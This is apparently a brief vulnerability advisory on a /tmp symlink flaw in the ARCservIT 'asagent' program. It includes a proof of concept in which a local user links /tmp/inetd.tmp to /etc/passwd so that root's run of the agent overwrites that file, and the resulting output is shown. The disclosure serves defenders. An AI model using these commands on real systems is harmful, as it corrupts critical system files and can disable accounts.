ARCservIT from Computer Associates contains a vulnerability which may allow malicious local users to corrupt arbitrary files.

When it runs with the parameters 'inet add', 'asagent', opens (and overwrites it if it exists) a file in /tmp called 'inetd.tmp'. 'asagent' does not check to make sure that this file already exists or that is a symbolic link to another file.

This may allow malicious local users to corrupt critical system files.

je@boxname~> ln -s /etc/passwd /tmp/inetd.tmp

And root:

root@boxname# /usr/CYEagent/asagent inet add

Then,

je@boxname~> cat /etc/passwd
asagentd 6051/tcp # ARCserve agent
asagentd 6051/udp # ARCserve agent
